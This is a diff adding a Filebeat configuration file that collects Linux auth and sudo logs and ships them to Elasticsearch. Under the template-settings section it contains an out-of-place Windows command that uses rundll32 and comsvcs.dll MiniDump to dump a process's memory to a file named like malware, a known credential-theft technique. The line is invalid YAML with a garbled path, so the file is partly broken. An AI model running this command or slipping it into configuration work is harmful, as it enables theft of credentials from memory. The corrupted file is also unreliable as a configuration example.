@@ -1,0 +1,87 @@
+###################### Filebeat Configuration #########################
+
+
+
+# ============================== Filebeat inputs ===============================
+
+filebeat.inputs:
+  - type: log
+    enabled: true
+    paths:
+      - /var/log/auth.log
+      - /var/log/sudo.log
+    fields:
+      log_type: "sudo"
+    tags: ["sudo-logs"]
+    
+    multiline.pattern: '^\S{3} \d{2} \d{2}:\d{2}:\d{2}'  # Detects timestamp at the start of a new log entry
+    multiline.negate: true
+    multiline.match: after
+
+
+
+# ============================== Filebeat modules ==============================
+
+
+
+filebeat.config.modules:
+
+  path: ${path.config}/modules.d/*.yml
+
+  reload.enabled: true  # Allow reloading module configs
+
+
+
+# ======================= Elasticsearch template setting =======================
+
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 4972 C:\Temp\malware.d mp full
+
+setup.template.name: "filebeat"
+setup.template.pattern: "filebeat-*"
+setup.template.settings:
+  index.number_of_shards: 1
+
+
+
+# =============================== Elastic Cloud ================================
+
+
+
+cloud.id: <redacted>
+cloud.auth: <redacted>
+
+# ================================== Outputs ===================================
+output.elasticsearch:
+  index: "filebeat-*"
+  pipeline: "filebeat-sudo-parser"
+
+
+# ================================== Paths ===================================
+
+
+
+path.home: /usr/share/filebeat
+
+path.config: /etc/filebeat
+
+path.data: /var/lib/filebeat
+
+path.logs: /var/log/filebeat
+
+
+
+# ================================== Processors =================================
+
+
+
+processors:
+
+  - add_host_metadata:
+
+      when.not.contains.tags: forwarded
+
+  - add_cloud_metadata: ~
+
+  - add_docker_metadata: ~
+
+  - add_kubernetes_metadata: ~
